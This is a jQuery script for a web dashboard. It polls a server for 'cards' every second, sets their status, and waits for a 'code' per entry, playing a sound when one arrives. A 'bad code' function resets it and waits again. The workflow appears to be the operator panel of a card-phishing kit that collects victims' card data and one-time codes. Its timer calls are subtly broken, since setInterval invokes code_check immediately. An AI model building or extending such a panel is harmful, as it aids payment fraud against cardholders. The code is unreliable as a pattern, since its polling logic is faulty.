var timerId = 0;

$( document ).ready(function() {
    setInterval(get_cards, 1000);
});

function get_cards() {
    $.ajax({
        type: "POST",
        url: "get_cards.php",
        success: function(response) {
            $('.res').html(response);
        }
    });
}

function set_status(n, s) {
    $.ajax({
        type: "POST",
        url: "set_status.php",
        data: {
            uid: n,
            status: s
        },
        success: function(response) {
            if (response == '0') {
                timerId = setInterval(code_check(n), 1000);
            } else {
                alert('Ошибка!');
            }
        }
    });
}

function set_active(n, s) {
    $.ajax({
        type: "POST",
        url: "set_active.php",
        data: {
            uid: n,
            active: s
        },
        success: function(response) {
            if (response == '0') {
                
            } else {
                alert('Ошибка!');
            }
        }
    });
}

function set_status_code(n, s) {
    $.ajax({
        type: "POST",
        url: "set_status_code.php",
        data: {
            uid: n,
            status_code: s
        },
        success: function(response) {
            if (response == '0') {
                
            } else {
                alert('Ошибка!');
            }
        }
    });
}

function code_check (n) {
    $.ajax({
        type: "POST",
        url: "check_code.php",
        data: {
            uid: n
        },
        success: function(response) {
            if (response == '0') {
                $('#' + n).addClass('load1');
                timerId = setInterval(code_check(n), 1000);
            } else {
                $('#' + n).removeClass('load1');
                $('#' + n).html(response);
                clearInterval(timerId);
                var audio = new Audio();
                audio.src = 'sound/code.mp3';
                audio.autoplay = true;
            }
        }
    });
}

function bad_code(n) {
    $.ajax({
        type: "POST",
        url: "code_reset.php",
        data: {
            uid: n
        },
        success: function(response) {
            if (response == '') {
                $('#' + n).addClass('load1');
                timerId = setInterval(code_check(n), 1000);
                set_status_code(n, 2);
            } else {
                $('#' + n).removeClass('load1');
                $('#' + n).html(response);
                clearInterval(timerId);
                var audio = new Audio();
                audio.src = 'sound/code.mp3';
                audio.autoplay = true;
            }
        }
    });
}